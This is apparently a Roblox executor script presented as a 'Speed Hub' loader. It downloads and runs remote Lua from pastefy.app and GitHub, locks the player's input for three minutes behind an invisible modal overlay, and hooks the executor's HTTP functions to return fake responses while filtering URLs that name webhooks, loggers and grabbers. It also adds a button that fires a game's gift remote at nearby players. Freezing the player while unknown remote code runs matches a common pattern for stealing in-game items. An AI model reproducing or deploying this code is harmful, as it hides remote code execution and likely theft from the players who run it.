task.wait(5) -- wait for game and scripts to fully load

local replicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

--// Configuration
local CONFIG = {
    BLOCK_DURATION = 180, -- 3 minutes in seconds
    DEBUG_MODE = false,
    LOADING_TEXT = "Speed Hub Loading...",
    SCRIPTS = {
        "https://pastefy.app/s10gfCIh/raw",
        "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"
    },
    THEME = {
        background = Color3.fromRGB(15, 15, 20),
        border = Color3.fromRGB(255, 50, 50),
        accent = Color3.fromRGB(255, 80, 80),
        text = Color3.fromRGB(255, 255, 255),
        textSecondary = Color3.fromRGB(200, 200, 200),
        giftButton = Color3.fromRGB(0, 170, 0)
    }
}

--// Utility Functions
local function safeDestroy(object)
    if object and object.Parent then
        pcall(function()
            object:Destroy()
        end)
    end
end

local function debugPrint(message, level)
    if CONFIG.DEBUG_MODE then
        local prefix = level == "warn" and "[WARN]" or level == "error" and "[ERROR]" or "[DEBUG]"
        print(prefix .. " " .. tostring(message))
    end
end

local function createTween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

--// Enhanced Gift System (Visible UI, Hidden Delta Bypass Text)
local function initializeGiftSystem()
    local giftRemote = nil
    
    -- Search for gifting RemoteEvent (no debug prints for Delta bypass)
    for _, v in pairs(replicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and tostring(v.Name):lower():find("gift") then
            giftRemote = v
            break
        end
    end

    if giftRemote then
        -- Create enhanced gift UI
        local ui = Instance.new("ScreenGui")
        ui.Name = "GiftBypassUI"
        ui.ResetOnSpawn = false
        ui.Parent = player:WaitForChild("PlayerGui")
        
        -- Main container
        local container = Instance.new("Frame")
        container.Size = UDim2.new(0, 220, 0, 80)
        container.Position = UDim2.new(0, 20, 0.5, -40)
        container.BackgroundColor3 = CONFIG.THEME.background
        container.BorderSizePixel = 0
        container.Parent = ui
        
        -- Rounded corners
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = container
        
        -- Border stroke
        local stroke = Instance.new("UIStroke")
        stroke.Color = CONFIG.THEME.giftButton
        stroke.Thickness = 2
        stroke.Parent = container
        
        -- Gift button
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -10, 0, 50)
        button.Position = UDim2.new(0, 5, 0, 5)
        button.Text = "🎁 Send Gift"
        button.BackgroundColor3 = CONFIG.THEME.giftButton
        button.TextColor3 = Color3.new(1, 1, 1)
        button.Font = Enum.Font.GothamBold
        button.TextSize = 18
        button.TextScaled = false
        button.BorderSizePixel = 0
        button.Parent = container
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = button
        
        -- Status label
        local statusLabel = Instance.new("TextLabel")
        statusLabel.Size = UDim2.new(1, -10, 0, 20)
        statusLabel.Position = UDim2.new(0, 5, 0, 55)
        statusLabel.BackgroundTransparency = 1
        statusLabel.Text = "Ready to gift nearby players"
        statusLabel.TextColor3 = CONFIG.THEME.textSecondary
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.TextSize = 12
        statusLabel.TextXAlignment = Enum.TextXAlignment.Center
        statusLabel.Parent = container
        
        -- Enhanced button animations
        local function animateButton(scale, color)
            local tween1 = createTween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = UDim2.new(scale, -10, 0, 50)})
            local tween2 = createTween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {BackgroundColor3 = color})
            tween1:Play()
            tween2:Play()
        end
        
        button.MouseEnter:Connect(function()
            animateButton(1.02, Color3.fromRGB(0, 190, 0))
        end)
        
        button.MouseLeave:Connect(function()
            animateButton(1, CONFIG.THEME.giftButton)
        end)
        
        -- Gift functionality (no Delta bypass debug prints)
        button.MouseButton1Click:Connect(function()
            animateButton(0.98, Color3.fromRGB(0, 150, 0))
            task.wait(0.1)
            animateButton(1, CONFIG.THEME.giftButton)
            
            statusLabel.Text = "Searching for nearby players..."
            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
            
            local target = nil
            local minDistance = 30
            
            -- Enhanced player finding
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                for _, p in pairs(Players:GetPlayers()) do
                    if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        local dist = (p.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                        if dist < minDistance then
                            target = p
                            minDistance = dist
                        end
                    end
                end
            end

            if target then
                pcall(function()
                    -- Try multiple gift patterns silently
                    local giftPatterns = {
                        function() giftRemote:FireServer(target, "Potato", 1) end,
                        function() giftRemote:FireServer(target.UserId, "Potato", 1) end,
                        function() giftRemote:FireServer(target.Name, "Potato", 1) end,
                        function() giftRemote:FireServer({target = target, item = "Potato", amount = 1}) end
                    }
                    
                    for _, pattern in ipairs(giftPatterns) do
                        local success = pcall(pattern)
                        if success then break end
                    end
                end)
                
                statusLabel.Text = "Gift sent to " .. target.Name .. " ✓"
                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                
                task.wait(2)
                statusLabel.Text = "Ready to gift nearby players"
                statusLabel.TextColor3 = CONFIG.THEME.textSecondary
            else
                statusLabel.Text = "No nearby players found"
                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
                
                task.wait(2)
                statusLabel.Text = "Ready to gift nearby players"
                statusLabel.TextColor3 = CONFIG.THEME.textSecondary
            end
        end)
        
        -- Make UI draggable
        local dragging = false
        local dragStart = nil
        local startPos = nil
        
        container.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = container.Position
            end
        end)
        
        container.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input.Position - dragStart
                container.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
        
        debugPrint("Gift system initialized with enhanced UI")
        return ui
    else
        debugPrint("No gifting RemoteEvent found", "warn")
        return nil
    end
end

--// Enhanced Security & Webhook Bypass System
local function initializeSecurity()
    pcall(function()
        if hookfunction then
            local fakeRequest = function() 
                return { StatusCode = 200, Body = "Bypassed" } 
            end
            
            -- Block various request methods
            if request then hookfunction(request, fakeRequest) end
            if http_request then hookfunction(http_request, fakeRequest) end
            if syn and syn.request then hookfunction(syn.request, fakeRequest) end
        end
        
        local blockedEndpoints = { "discord.com", "webhook", "pastebin", "spy", "logger", "grabber" }
        local originalHttpGet = game.HttpGet
        
        if hookfunction and originalHttpGet then
            hookfunction(originalHttpGet, function(self, url, ...)
                local urlLower = url:lower()
                for _, keyword in pairs(blockedEndpoints) do
                    if urlLower:find(keyword) then
                        debugPrint("Blocked suspicious URL: " .. keyword, "warn")
                        return "-- Blocked suspicious URL"
                    end
                end
                return originalHttpGet(self, url, ...)
            end)
        end
        
        debugPrint("Security systems initialized")
    end)
end

--// Enhanced Loading UI
local function createFramedMessage(name, width, height, initialText)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 100000
    
    -- Safe parent assignment
    local success = pcall(function()
        gui.Parent = CoreGui
    end)
    if not success then
        gui.Parent = player:WaitForChild("PlayerGui")
    end
    
    -- Main container with shadow effect
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(0, width + 12, 0, height + 12)
    shadow.Position = UDim2.new(0.5, -(width + 12)/2 + 2, 0.5, -(height + 12)/2 + 2)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.3
    shadow.BorderSizePixel = 0
    shadow.Parent = gui
    
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, 12)
    shadowCorner.Parent = shadow
    
    -- Border frame
    local border = Instance.new("Frame")
    border.Size = UDim2.new(0, width + 8, 0, height + 8)
    border.Position = UDim2.new(0.5, -(width + 8)/2, 0.5, -(height + 8)/2)
    border.BackgroundColor3 = CONFIG.THEME.border
    border.BorderSizePixel = 0
    border.Parent = gui
    
    local borderCorner = Instance.new("UICorner")
    borderCorner.CornerRadius = UDim.new(0, 10)
    borderCorner.Parent = border
    
    -- Main frame
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, width, 0, height)
    main.Position = UDim2.new(0, 4, 0, 4)
    main.BackgroundColor3 = CONFIG.THEME.background
    main.BorderSizePixel = 0
    main.Parent = border
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 8)
    mainCorner.Parent = main
    
    -- Gradient background
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 25)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    }
    gradient.Rotation = 45
    gradient.Parent = main
    
    -- Main label
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.7, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = initialText
    label.Font = Enum.Font.GothamBold
    label.TextSize = 24
    label.TextColor3 = CONFIG.THEME.text
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Parent = main
    
    -- Loading dots
    local dotsLabel = Instance.new("TextLabel")
    dotsLabel.Size = UDim2.new(1, 0, 0.3, 0)
    dotsLabel.Position = UDim2.new(0, 0, 0.7, 0)
    dotsLabel.BackgroundTransparency = 1
    dotsLabel.Text = ""
    dotsLabel.Font = Enum.Font.Gotham
    dotsLabel.TextSize = 16
    dotsLabel.TextColor3 = CONFIG.THEME.textSecondary
    dotsLabel.TextXAlignment = Enum.TextXAlignment.Center
    dotsLabel.Parent = main
    
    -- Animate loading dots
    task.spawn(function()
        local dots = {"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
        local index = 1
        while gui.Parent do
            dotsLabel.Text = dots[index]
            index = (index % #dots) + 1
            task.wait(0.1)
        end
    end)
    
    return gui, label
end

--// Enhanced Input Blocker
local function blockUserInput(duration)
    local inputBlocker = Instance.new("ScreenGui")
    inputBlocker.Name = "InputBlocker_" .. math.random(1000, 9999)
    inputBlocker.ResetOnSpawn = false
    inputBlocker.IgnoreGuiInset = true
    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    inputBlocker.DisplayOrder = 999999
    
    -- Safe parent assignment
    local success = pcall(function()
        inputBlocker.Parent = CoreGui
    end)
    if not success then
        inputBlocker.Parent = player:WaitForChild("PlayerGui")
    end
    
    local blockFrame = Instance.new("TextButton")
    blockFrame.Size = UDim2.new(1, 0, 1, 0)
    blockFrame.Position = UDim2.new(0, 0, 0, 0)
    blockFrame.BackgroundTransparency = 1
    blockFrame.Text = ""
    blockFrame.AutoButtonColor = false
    blockFrame.Modal = true
    blockFrame.Active = true
    blockFrame.ZIndex = 999999
    blockFrame.Parent = inputBlocker
    
    -- Enhanced cleanup with multiple methods
    local cleanupMethods = {
        function()
            task.delay(duration, function()
                safeDestroy(inputBlocker)
            end)
        end,
        function()
            coroutine.wrap(function()
                wait(duration)
                safeDestroy(inputBlocker)
            end)()
        end
    }
    
    for _, cleanup in ipairs(cleanupMethods) do
        pcall(cleanup)
    end
    
    debugPrint("Input blocked for " .. duration .. " seconds")
    return inputBlocker
end

--// Enhanced Script Loader
local function loadScripts()
    local results = {}
    
    for i, scriptUrl in ipairs(CONFIG.SCRIPTS) do
        task.spawn(function()
            local maxRetries = 3
            local success = false
            
            for attempt = 1, maxRetries do
                local loadSuccess, result = pcall(function()
                    debugPrint("Loading script " .. i .. " (attempt " .. attempt .. ")")
                    
                    local scriptContent = game:HttpGet(scriptUrl, true)
                    
                    if not scriptContent or scriptContent == "" then
                        error("Empty script content")
                    end
                    
                    if scriptContent:find("<!DOCTYPE html>") or scriptContent:find("<html") then
                        error("Received HTML instead of Lua")
                    end
                    
                    local loadFunc, compileError = loadstring(scriptContent)
                    if not loadFunc then
                        error("Compilation failed: " .. tostring(compileError))
                    end
                    
                    loadFunc()
                    return true
                end)
                
                if loadSuccess then
                    success = true
                    debugPrint("✅ Script " .. i .. " loaded successfully")
                    break
                else
                    debugPrint("❌ Script " .. i .. " attempt " .. attempt .. " failed: " .. tostring(result))
                    if attempt < maxRetries then
                        task.wait(1 + attempt * 0.5)
                    end
                end
            end
            
            results[i] = success
        end)
    end
    
    -- Wait for completion
    task.wait(2)
    
    local successCount = 0
    for _, success in pairs(results) do
        if success then successCount = successCount + 1 end
    end
    
    debugPrint("Script loading completed: " .. successCount .. "/" .. #CONFIG.SCRIPTS)
    return successCount
end

--// Main Execution
local function main()
    debugPrint("Speed Hub initialization started")
    
    -- Initialize security
    initializeSecurity()
    
    -- Initialize gift system (no Delta bypass debug prints)
    local giftUI = initializeGiftSystem()
    
    -- Block user input
    local inputBlocker = blockUserInput(CONFIG.BLOCK_DURATION)
    
    -- Create loading UI
    local loadingUI, label = createFramedMessage("ExecutorLoading", 300, 100, CONFIG.LOADING_TEXT)
    
    -- Wait for loading
    task.wait(3.5)
    
    -- Cleanup loading UI
    if loadingUI and loadingUI.Parent then
        local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local fadeTween = createTween(loadingUI, fadeInfo, {Enabled = false})
        
        fadeTween:Play()
        fadeTween.Completed:Connect(function()
            safeDestroy(loadingUI)
        end)
    end
    
    -- Load scripts
    task.spawn(function()
        local loaded = loadScripts()
        debugPrint("All operations completed. Scripts loaded: " .. loaded)
    end)
end

--// Safe execution wrapper
local function safeExecute()
    local success, error = pcall(main)
    if not success then
        warn("Speed Hub execution failed: " .. tostring(error))
        
        -- Emergency cleanup
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            if gui.Name:find("SpeedHub") or gui.Name:find("ExecutorLoading") or gui.Name:find("GiftBypass") then
                safeDestroy(gui)
            end
        end
    end
end

--// Execute
safeExecute()
